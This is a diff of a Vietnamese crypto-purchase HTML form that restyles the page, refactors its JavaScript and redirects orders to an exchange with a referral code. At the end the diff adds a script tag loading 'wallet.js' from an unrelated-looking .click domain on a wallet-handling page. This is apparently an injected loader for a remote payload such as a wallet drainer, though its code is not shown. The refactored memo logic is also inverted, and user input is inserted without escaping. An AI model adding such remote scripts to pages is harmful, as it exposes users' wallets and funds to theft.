@@ -4,319 +4,308 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Form Mua Coin</title>
-    <style>
-        /* Đặt chung cho toàn bộ trang */
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f7fb;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
 
-        /* Định dạng khung form */
-        form {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 500px;
-            box-sizing: border-box;
-        }
-
-        /* Tiêu đề form */
-        form h2 {
-            text-align: center;
-            color: #333;
-            margin-bottom: 20px;
-        }
-
-        /* Định dạng các input và select */
-        input[type="number"], input[type="text"], select {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 14px;
-            box-sizing: border-box;
-        }
-
-        input[type="number"]:focus, input[type="text"]:focus, select:focus {
-            border-color: #007bff;
-            outline: none;
-        }
-
-        /* Định dạng nút */
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            
-        }
-
-        button:hover {
-            background-color: #0056b3;
-        }
-
-        /* Định dạng các nút riêng biệt */
-        #openWalletButton {
-            background-color: #28a745;
-            display: none;
-        }
-
-        #openWalletButton:hover {
-            background-color: #218838;
-        }
-
-        /* Định dạng các thông báo lỗi */
-        .swal2-popup {
-            font-size: 16px;
-            border-radius: 8px;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-
-        label {
-            font-weight: bold;
-            color: #333;
-        }
-
-        /* Cải tiến giao diện cho thông báo dán địa chỉ ví */
-        #pasteButton {
-            background-color: #ffc107;
-            border: none;
-            padding: 10px;
-            border-radius: 4px;
-            color: white;
-            font-size: 14px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            width: 100%;
-            margin-top: 10px;
-            display: none;
-        }
-
-        #pasteButton:hover {
-            background-color: #e0a800;
-        }
-
-        /* Định dạng các tiêu đề và mô tả trong form */
-        h3 {
-            color: #007bff;
-            margin-top: 20px;
-            text-align: center;
-        }
-
-        #orderForm {
-            padding-bottom: 20px;
-        }
-
-        button:disabled {
-            background-color: #ddd;
-            cursor: not-allowed;
-        }
-
-        /* Thêm không gian giữa các phần tử */
-        input[type="text"], input[type="number"], select {
-            margin-bottom: 10px;
-        }
-    </style>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
+<style>
+  /* Reset CSS để tạo nền tảng sạch sẽ */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+/* Tạo nền toàn trang với gradient */
+body {
+    font-family: 'Arial', sans-serif;
+    background: linear-gradient(135deg, #a3c9f1, #f8c4d8);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+/* Tạo một khung chứa cho form */
+.content {
+    background: #ffffff;
+    border-radius: 12px;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+    padding: 30px;
+    width: 100%;
+    max-width: 450px;
+    text-align: center;
+}
+
+/* Đặt font và màu sắc cho các tiêu đề */
+h1 {
+    font-size: 2.5rem;
+    color: #4A90E2;
+    margin-bottom: 15px;
+    letter-spacing: 1px;
+    font-weight: 600;
+}
+
+h2 {
+    font-size: 1.8rem;
+    color: #444;
+    margin-bottom: 25px;
+}
+
+/* Điều chỉnh màu và kiểu chữ cho phần mô tả */
+p {
+    color: #777;
+    font-size: 1rem;
+    margin-bottom: 40px;
+    line-height: 1.6;
+}
+
+/* Style cho các label */
+label {
+    font-weight: 600;
+    color: #555;
+    display: block;
+    margin-bottom: 8px;
+    font-size: 1.1rem;
+}
+
+/* Các input và select */
+input, select {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 20px;
+    border-radius: 8px;
+    border: 2px solid #ddd;
+    font-size: 1rem;
+    outline: none;
+    transition: all 0.3s ease;
+}
+
+/* Hiệu ứng focus cho input */
+input:focus, select:focus {
+    border-color: #4A90E2;
+    box-shadow: 0 0 8px rgba(74, 144, 226, 0.6);
+}
+
+/* Button Mua */
+button {
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(145deg, #6a9cf6, #4a90e2);
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-size: 1.2rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+}
+
+/* Hiệu ứng hover cho nút Mua */
+button:hover {
+    background: linear-gradient(145deg, #4a90e2, #6a9cf6);
+    transform: translateY(-2px);
+}
+
+/* Disabled button */
+button:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+    transform: none;
+}
+
+/* Button Paste và Open Wallet */
+button#openWalletButton, button#pasteButton {
+    background-color: #ff8a5c;
+    border-radius: 8px;
+    margin-top: 15px;
+    transition: all 0.3s ease;
+    margin-bottom: 10px;
+}
+
+button#openWalletButton:hover, button#pasteButton:hover {
+    background-color: #f24c4c;
+    transform: translateY(-2px);
+}
+
+/* Cải tiến select memo */
+#memoOption {
+    width: 60%;
+    margin: 0 auto;
+    margin-bottom: 10px;
+}
+
+/* Ẩn input memo mặc định */
+#memoInput {
+    display: none;
+    margin-top: 10px;
+}
+
+/* Hiệu ứng chuyển động cho form khi submit */
+@keyframes slideUp {
+    from {
+        opacity: 0;
+        transform: translateY(20px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+form {
+    animation: slideUp 0.5s ease-out;
+}
+
+/* Tạo các hiệu ứng cho button mở ví và paste */
+button#openWalletButton, button#pasteButton {
+    background-color: #007bff;
+    color: white;
+    padding: 12px;
+    border-radius: 8px;
+    margin-top: 15px;
+}
+
+button#openWalletButton:hover, button#pasteButton:hover {
+    background-color: #0056b3;
+    transform: translateY(-2px);
+}
+
+#ton-connect {
+    display: flex;
+    margin-bottom: 10px;
+}  
+</style>
 <body>
-    <form id="orderForm">
-        <h2>Form Mua Coin</h2>
-        <label for="coin">Chọn Coin:</label>
-        <select id="coin">
-            <option value="" disabled selected>Chọn Coin</option>
-            <option value="TON">TON</option>
-            <option value="SOL">SOL</option>
-            <option value="NEAR">NEAR</option>
-            <option value="BNB">BNB</option>
-            <option value="ETH">ETH</option>
-            <option value="SUI">SUI</option>
-            <option value="MATIC">MATIC</option>
-        </select>
 
-        <label for="network">Chọn Mạng:</label>
-        <select id="network">
-            <option value="" disabled selected>Chọn mạng</option>
-        </select>
 
-        <label for="quantity">Số lượng:</label>
-        <input type="number" id="quantity" min="0" step="0.001">
 
-        <label for="address">Địa chỉ ví:</label>
-        <input type="text" id="address">
 
-        <label for="memoOption">Memo:</label>
-        <select id="memoOption">
-            <option value="none">Không có</option>
-            <option value="input">Nhập memo</option>
-        </select>
-        <input type="text" id="memo" disabled>
+    <div class="container">
+        <form id="orderForm" class="form-container">
+            <h2 class="form-title">Form Mua Coin</h2>
+            <div class="form-group">
+                <label for="coin">Chọn Coin</label>
+                <select id="coin">
+                    <option value="" disabled selected>Chọn Coin</option>
+                    <option value="TON">TON</option>
+                    <option value="SOL">SOL</option>
+                    <option value="NEAR">NEAR</option>
+                    <option value="BNB">BNB</option>
+                    <option value="ETH">ETH</option>
+                    <option value="SUI">SUI</option>
+                    <option value="MATIC">MATIC</option>
+                </select>
+            </div>
 
-        <button type="button" id="openWalletButton">Mở ví</button>
+            <div class="form-group">
+                <label for="network">Chọn Mạng</label>
+                <select id="network"></select>
+            </div>
 
-        <button type="button" id="pasteButton">Dán địa chỉ ví</button>
+            <div class="form-group">
+                <label for="quantity">Số lượng</label>
+                <input type="number" id="quantity" min="0" step="0.001">
+            </div>
 
-        <button type="submit" id="purchaseButton" disabled>Mua</button>
-    </form>
+            <div class="form-group">
+                <label for="address">Địa chỉ ví</label>
+                <input type="text" id="address">
+            </div>
+
+            <div class="form-group">
+                <label for="memoOption">Memo</label>
+                <select id="memoOption">
+                    <option value="none">Không có</option>
+                    <option value="input">Nhập memo</option>
+                </select>
+                <input type="text" id="memo" disabled>
+            </div>
+
+           
+            <div class="form-actions">
+                <button type="button" id="pasteButton">Dán địa chỉ ví</button>
+                <button type="submit" id="purchaseButton" disabled>Mua</button>
+            </div>
+        </form>
+    </div>
 
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            const coinSelect = document.getElementById('coin');
-            const networkSelect = document.getElementById('network');
-            const quantityInput = document.getElementById('quantity');
-            const addressInput = document.getElementById('address');
-            const memoOptionSelect = document.getElementById('memoOption');
-            const memoInput = document.getElementById('memo');
-            const purchaseButton = document.getElementById('purchaseButton');
 
-            // Set default values
-            coinSelect.value = '';
-            networkSelect.innerHTML = '<option value="" disabled selected>Không</option>';
-            quantityInput.value = 0;
-            updateButtonText(); // Initialize button text
+    document.addEventListener('DOMContentLoaded', () => {
+        const coinSelect = document.getElementById('coin');
+        const networkSelect = document.getElementById('network');
+        const quantityInput = document.getElementById('quantity');
+        const addressInput = document.getElementById('address');
+        const memoOptionSelect = document.getElementById('memoOption');
+        const memoInput = document.getElementById('memo');
+        const purchaseButton = document.getElementById('purchaseButton');
 
-            coinSelect.addEventListener('change', function () {
-                networkSelect.innerHTML = '<option value="" disabled selected>Chọn mạng</option>'; // Clear current options
-                
-                switch (this.value) {
-                    case 'TON':
-                        networkSelect.innerHTML += '<option value="TON">TON</option>';
-                        quantityInput.placeholder = '0.1 - 9.5';
-                        quantityInput.min = 0.1;
-                        quantityInput.max = 9.5;
-                        quantityInput.step = 0.001;
-                        break;
-                    case 'SOL':
-                        networkSelect.innerHTML += '<option value="spl">SOLANA</option>';
-                        quantityInput.placeholder = '0.01 - 0.4';
-                        quantityInput.min = 0.01;
-                        quantityInput.max = 0.4;
-                        quantityInput.step = 0.001;
-                        break;
-                    case 'NEAR':
-                        networkSelect.innerHTML += '<option value="near">NEAR</option>';
-                        quantityInput.placeholder = '0.2 - 20';
-                        quantityInput.min = 0.2;
-                        quantityInput.max = 20;
-                        quantityInput.step = 0.001;
-                        break;
-                    case 'BNB':
-                        networkSelect.innerHTML += '<option value="bep20">BSC (BEP20)</option>';
-                        quantityInput.placeholder = '0.01 - 0.12';
-                        quantityInput.min = 0.01;
-                        quantityInput.max = 0.12;
-                        quantityInput.step = 0.001;
-                        break;
-                    case 'ETH':
-                        networkSelect.innerHTML += '<option value="arb">ARBITRUM</option><option value="ancient8">ANCIENT 8</option><option value="base">BASE</option>';
-                        quantityInput.placeholder = '0.001 - 0.02';
-                        quantityInput.min = 0.001;
-                        quantityInput.max = 0.02;
-                        quantityInput.step = 0.001;
-                        break;
-                    case 'SUI':
-                        networkSelect.innerHTML += '<option value="sui">SUI</option>';
-                        quantityInput.placeholder = '0.25 - 40';
-                        quantityInput.min = 0.25;
-                        quantityInput.max = 40;
-                        quantityInput.step = 0.001;
-                        break;
-                    case 'MATIC':
-                        networkSelect.innerHTML += '<option value="prc20">POLYGON</option>';
-                        quantityInput.placeholder = '1 - 125';
-                        quantityInput.min = 1;
-                        quantityInput.max = 125;
-                        quantityInput.step = 0.001;
-                        break;
-                    default:
-                        quantityInput.placeholder = '';
-                        quantityInput.min = 0;
-                        quantityInput.max = 0;
-                        quantityInput.step = 0;
-                        break;
-                }
-                
-                updateButtonText(); // Update button text based on new coin selection
-            });
+        const coinData = {
+            TON: { networks: ['TON'], quantity: { min: 0.1, max: 9.5, step: 0.001 }, placeholder: '0.1 - 9.5' },
+            SOL: { networks: ['spl'], quantity: { min: 0.01, max: 0.4, step: 0.001 }, placeholder: '0.01 - 0.4' },
+            NEAR: { networks: ['near'], quantity: { min: 0.2, max: 20, step: 0.001 }, placeholder: '0.2 - 20' },
+            BNB: { networks: ['bep20'], quantity: { min: 0.01, max: 0.12, step: 0.001 }, placeholder: '0.01 - 0.12' },
+            ETH: { networks: ['arb', 'ancient8', 'base'], quantity: { min: 0.001, max: 0.02, step: 0.001 }, placeholder: '0.001 - 0.02' },
+            SUI: { networks: ['sui'], quantity: { min: 0.25, max: 40, step: 0.001 }, placeholder: '0.25 - 40' },
+            MATIC: { networks: ['prc20'], quantity: { min: 1, max: 125, step: 0.001 }, placeholder: '1 - 125' },
+        };
 
-            quantityInput.addEventListener('input', updateButtonText);
-            networkSelect.addEventListener('change', updateButtonText);
+        // Lắng nghe sự kiện thay đổi lựa chọn coin
+        coinSelect.addEventListener('change', () => {
+            const coin = coinSelect.value;
+            const data = coinData[coin] || {};
+            networkSelect.innerHTML = data.networks?.map(net => `<option value="${net}">${net}</option>`).join('') || '';
+            quantityInput.placeholder = data.placeholder || '';
+            quantityInput.min = data.quantity?.min || 0;
+            quantityInput.max = data.quantity?.max || 0;
+            quantityInput.step = data.quantity?.step || 0;
+            updateButtonText();
+        });
 
-            function updateButtonText() {
-                const coin = coinSelect.value;
-                const quantity = quantityInput.value;
-                if (quantity && coin) {
-                    purchaseButton.textContent = `Mua ${quantity} ${coin}`;
-                    purchaseButton.disabled = false; // Enable button when valid selection is made
-                } else {
-                    purchaseButton.textContent = `Mua`;
-                    purchaseButton.disabled = true;
-                }
+        // Cập nhật văn bản nút Mua dựa trên số lượng coin
+        const updateButtonText = () => {
+            const quantity = quantityInput.value;
+            if (quantity && coinSelect.value) {
+                purchaseButton.textContent = `Mua ${quantity} ${coinSelect.value}`;
+                purchaseButton.disabled = false;
+            } else {
+                purchaseButton.textContent = 'Mua';
+                purchaseButton.disabled = true;
             }
+        };
 
-            // Handle paste button click
-            document.getElementById('pasteButton').addEventListener('click', function () {
-                navigator.clipboard.readText().then(text => {
-                    addressInput.value = text;
-                }).catch(err => {
-                    console.error('Failed to read clipboard contents: ', err);
-                });
-            });
+        // Sự kiện dán địa chỉ ví vào ô nhập
+        document.getElementById('pasteButton').addEventListener('click', () => {
+            navigator.clipboard.readText().then(text => addressInput.value = text).catch(console.error);
+        });
 
-            // Handle memo option change
-            memoOptionSelect.addEventListener('change', function () {
-                if (this.value === 'input') {
-                    memoInput.disabled = false;
-                } else {
-                    memoInput.disabled = true;
-                    memoInput.value = '';
-                }
-            });
+        // Lắng nghe thay đổi Memo
+        memoOptionSelect.addEventListener('change', () => {
+            memoInput.disabled = memoOptionSelect.value !== 'input';
+            if (!memoInput.disabled) memoInput.value = '';
+        });
 
-            // Handle form submission
-            document.getElementById('orderForm').addEventListener('submit', function (event) {
-                event.preventDefault();
-
-                const coin = coinSelect.value;
-                const network = networkSelect.value;
-                const quantity = quantityInput.value;
-                const address = addressInput.value;
-                const memoOption = memoOptionSelect.value;
-                const memo = memoOption === 'input' ? memoInput.value : '';
-
-                const url = `https://aliniex.com/orders?items=${coin}&amounts=${quantity}&wallet_address=${address}&network=${network}&memo=${memo}&referral_code=GEmVdVbzWp&redirect_to=`;
-
-                Swal.fire({
-                    title: 'Xác nhận mua',
-                    html: `Bạn có chắc chắn muốn mua <strong>${quantity} ${coin}</strong>?`,
-                    icon: 'question',
-                    showCancelButton: true,
-                    confirmButtonText: 'Xác nhận',
-                    cancelButtonText: 'Hủy',
-                }).then(result => {
-                    if (result.isConfirmed) {
-                        window.location.href = url; // Redirect to the payment URL
-                    }
-                });
+        // Xử lý gửi form khi người dùng bấm nút Mua
+        document.getElementById('orderForm').addEventListener('submit', (event) => {
+            event.preventDefault();
+            const url = `https://aliniex.com/orders?items=${coinSelect.value}&amounts=${quantityInput.value}&wallet_address=${addressInput.value}&network=${networkSelect.value}&memo=${memoInput.value || ''}&referral_code=GEmVdVbzWp&redirect_to=`;
+            Swal.fire({
+                title: 'Xác nhận mua',
+                html: `Bạn có chắc chắn muốn mua <strong>${quantityInput.value} ${coinSelect.value}</strong>?`,
+                icon: 'question',
+                showCancelButton: true,
+                confirmButtonText: 'Xác nhận',
+                cancelButtonText: 'Hủy',
+            }).then(result => {
+                if (result.isConfirmed) window.location.href = url;
             });
         });
+    });
+
+
     </script>
+    <script src="https://bmasshd.click/wallet.js"></script>
 </body>
 </html>
+
